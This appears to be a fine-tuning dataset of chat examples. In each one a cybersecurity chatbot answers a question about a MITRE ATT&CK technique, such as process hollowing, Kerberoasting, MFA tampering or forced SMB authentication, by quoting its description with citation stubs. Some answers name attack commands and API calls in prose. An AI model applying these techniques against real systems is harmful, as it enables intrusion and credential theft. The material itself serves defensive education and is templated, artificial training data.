{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'DLL Side-Loading' and with the Id: T1073 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'DLL Side-Loading' and with the Id: T1073 is described as follows: Programs may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests (Citation: MSDN Manifests) are not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable to side-loading to load a malicious DLL. (Citation: Stewart 2014)Adversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Process Hollowing' and with the Id: T1055.012 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Process Hollowing' and with the Id: T1055.012 is described as follows: Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation: Elastic Process Injection July 2017)This is very similar to [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process. . The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exploitation for Privilege Escalation' and with the Id: T1068 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exploitation for Privilege Escalation' and with the Id: T1068 is described as follows: Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.When initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.Adversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).. The systems targeted by this attack pattern are: Linux, macOS, Windows, Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Resource Forking' and with the Id: T1564.009 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Resource Forking' and with the Id: T1564.009 is described as follows: Adversaries may abuse resource forks to hide malicious code or executables to evade detection and bypass security applications. A resource fork provides applications a structured way to store resources such as thumbnail images, menu definitions, icons, dialog boxes, and code.(Citation: macOS Hierarchical File System Overview) Usage of a resource fork is identifiable when displaying a file\u2019s extended attributes, using <code>ls -l@</code> or <code>xattr -l</code> commands. Resource forks have been deprecated and replaced with the application bundle structure. Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the <code>/Resources</code> folder.(Citation: Resource and Data Forks)(Citation: ELC Extended Attributes)Adversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.(Citation: sentinellabs resource named fork 2020)(Citation: tau bundlore erika noerenberg 2020). The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Account Access Removal' and with the Id: T1531 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Account Access Removal' and with the Id: T1531 is described as follows: Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. Adversaries may also subsequently log off and/or perform a [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to set malicious changes into place.(Citation: CarbonBlack LockerGoga 2019)(Citation: Unit42 LockerGoga 2019)In Windows, [Net](https://attack.mitre.org/software/S0039) utility, <code>Set-LocalUser</code> and <code>Set-ADAccountPassword</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets may be used by adversaries to modify user accounts. In Linux, the <code>passwd</code> utility may be used to change passwords. Accounts could also be disabled by Group Policy. Adversaries who use ransomware or similar attacks may first perform this and other Impact behaviors, such as [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Defacement](https://attack.mitre.org/techniques/T1491), in order to impede incident response/recovery before completing the [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) objective. . The systems targeted by this attack pattern are: Linux, macOS, Windows, Office 365, SaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Credential Stuffing' and with the Id: T1110.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Credential Stuffing' and with the Id: T1110.004 is described as follows: Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.Credential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.Typically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:* SSH (22/TCP)* Telnet (23/TCP)* FTP (21/TCP)* NetBIOS / SMB / Samba (139/TCP & 445/TCP)* LDAP (389/TCP)* Kerberos (88/TCP)* RDP / Terminal Services (3389/TCP)* HTTP/HTTP Management Services (80/TCP & 443/TCP)* MSSQL (1433/TCP)* Oracle (1521/TCP)* MySQL (3306/TCP)* VNC (5900/TCP)In addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). The systems targeted by this attack pattern are: Windows, Azure AD, Office 365, SaaS, IaaS, Linux, macOS, Google Workspace, Containers, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Kerberoasting' and with the Id: T1208 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Kerberoasting' and with the Id: T1208 is described as follows: Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service (Citation: Microsoft Detecting Kerberoasting Feb 2018)). (Citation: Microsoft SPN) (Citation: Microsoft SetSPN) (Citation: SANS Attacking Kerberos Nov 2014) (Citation: Harmj0y Kerberoast Nov 2016)Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). (Citation: Empire InvokeKerberoast Oct 2016) (Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials. (Citation: AdSecurity Cracking Kerberos Dec 2015) (Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)This same attack could be executed using service tickets captured from network traffic. (Citation: AdSecurity Cracking Kerberos Dec 2015)Cracked hashes may enable Persistence, Privilege Escalation, and  Lateral Movement via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078). (Citation: SANS Attacking Kerberos Nov 2014). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Obfuscated Files or Information' and with the Id: T1027 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Obfuscated Files or Information' and with the Id: T1027 is described as follows: Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript. Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)Adversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017) . The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Multi-Factor Authentication' and with the Id: T1556.006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Multi-Factor Authentication' and with the Id: T1556.006 is described as follows: Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.Once adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as [Multi-Factor Authentication Request Generation](https://attack.mitre.org/techniques/T1621), adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.(Citation: Mandiant APT42)(Citation: Azure AD Conditional Access Exclusions)For example, modifying the Windows hosts file (`C:\\windows\\system32\\drivers\\etc\\hosts`) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a \"fail open\" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA. (Citation: Russians Exploit Default MFA Protocol - CISA March 2022) Depending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.(Citation: Russians Exploit Default MFA Protocol - CISA March 2022) . The systems targeted by this attack pattern are: Windows, Azure AD, Office 365, SaaS, IaaS, Google Workspace, Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Remote Email Collection' and with the Id: T1114.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Remote Email Collection' and with the Id: T1114.002 is described as follows: Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as [MailSniper](https://attack.mitre.org/software/S0413) can be used to automate searches for specific keywords.. The systems targeted by this attack pattern are: Office 365, Windows, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'IIS Components' and with the Id: T1505.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'IIS Components' and with the Id: T1505.004 is described as follows: Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: <code>Get{Extension/Filter}Version</code>, <code>Http{Extension/Filter}Proc</code>, and (optionally) <code>Terminate{Extension/Filter}</code>. IIS modules may also be installed to extend IIS web servers.(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: IIS Backdoor 2011)(Citation: Trustwave IIS Module 2013)Adversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Extension All Incoming 2017)(Citation: Dell TG-3390)(Citation: Trustwave IIS Module 2013)(Citation: MMPC ISAPI Filter 2012)Adversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports <code>RegisterModule</code>, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.(Citation: Microsoft IIS Modules Overview 2007)(Citation: Trustwave IIS Module 2013)(Citation: ESET IIS Malware 2021). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Invalid Code Signature' and with the Id: T1036.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Invalid Code Signature' and with the Id: T1036.001 is described as follows: Adversaries may attempt to mimic features of valid code signatures to increase the chance of deceiving a user, analyst, or tool. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program. Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files.(Citation: Threatexpress MetaTwin 2017)Unlike [Code Signing](https://attack.mitre.org/techniques/T1553/002), this activity will not result in a valid signature.. The systems targeted by this attack pattern are: macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Run Virtual Instance' and with the Id: T1564.006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Run Virtual Instance' and with the Id: T1564.006 is described as follows: Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.(Citation: SingHealth Breach Jan 2019)Adversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.(Citation: Sophos Ragnar May 2020). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Trap' and with the Id: T1154 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Trap' and with the Id: T1154 is described as follows: The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common  keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>. Adversaries can use this to register code to be executed when the shell encounters specific interrupts either to gain execution or as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where \"command list\" will be executed when \"signals\" are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements). The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Password Policy Discovery' and with the Id: T1201 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Password Policy Discovery' and with the Id: T1201 is described as follows: Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code> (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to discover password policy information (e.g. <code>show aaa</code>, <code>show aaa common-criteria policy all</code>).(Citation: US-CERT-TA18-106A)Password policies can be discovered in cloud environments using available APIs such as <code>GetAccountPasswordPolicy</code> in AWS (Citation: AWS GetPasswordPolicy).. The systems targeted by this attack pattern are: Windows, Linux, macOS, IaaS, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Event Triggered Execution' and with the Id: T1546 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Event Triggered Execution' and with the Id: T1546 is described as follows: Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.(Citation: Backdooring an AWS account)(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft DART Case Report 001)Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.(Citation: FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. . The systems targeted by this attack pattern are: Linux, macOS, Windows, SaaS, IaaS, Office 365 ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Unix Shell Configuration Modification' and with the Id: T1546.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Unix Shell Configuration Modification' and with the Id: T1546.004 is described as follows: Adversaries may establish persistence through executing malicious commands triggered by a user\u2019s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (<code>/etc</code>) and the user\u2019s home directory (<code>~/</code>) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user\u2019s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files.(Citation: intezer-kaiji-malware)(Citation: bencane blog bashrc) These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when a user opens a command-line interface or connects remotely.(Citation: anomali-rocke-tactics)(Citation: Linux manual bash invocation) Since the system only executes the first existing file in the listed order, adversaries have used <code>~/.bash_profile</code> to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code> file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface.(Citation: Tsunami)(Citation: anomali-rocke-tactics)(Citation: anomali-linux-rabbit)(Citation: Magento) Some malware targets the termination of a program to trigger execution, adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session. For macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>.(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation: code_persistence_zsh)(Citation: macOS MS office sandbox escape) The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.. The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Forced Authentication' and with the Id: T1187 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Forced Authentication' and with the Id: T1187 is described as follows: Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. (Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security)Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server. (Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to plaintext credentials. (Citation: Cylance Redirect to SMB)There are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include:* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger the SMB request. (Citation: US-CERT APT Energy Oct 2017)* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\\\[remote address]\\pic.png</code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT Energy Oct 2017). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'SID-History Injection' and with the Id: T1134.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'SID-History Injection' and with the Id: T1134.005 is described as follows: Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002), or [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Network Boundary Bridging' and with the Id: T1599 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Network Boundary Bridging' and with the Id: T1599 is described as follows: Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.When an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003) or exfiltration of data via [Traffic Duplication](https://attack.mitre.org/techniques/T1020/001). Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with [Internal Proxy](https://attack.mitre.org/techniques/T1090/001) to achieve the same goals.(Citation: Kaspersky ThreatNeedle Feb 2021)  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.. The systems targeted by this attack pattern are: Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data Encrypted for Impact' and with the Id: T1486 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data Encrypted for Impact' and with the Id: T1486 is described as follows: Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018)In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack Conti July 2020) In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) To maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017) Encryption malware may also leverage [Internal Defacement](https://attack.mitre.org/techniques/T1491/001), such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").(Citation: NHS Digital Egregor Nov 2020)In cloud environments, storage objects within compromised accounts may also be encrypted.(Citation: Rhino S3 Ransomware Part 1). The systems targeted by this attack pattern are: Linux, macOS, Windows, IaaS ."}]}
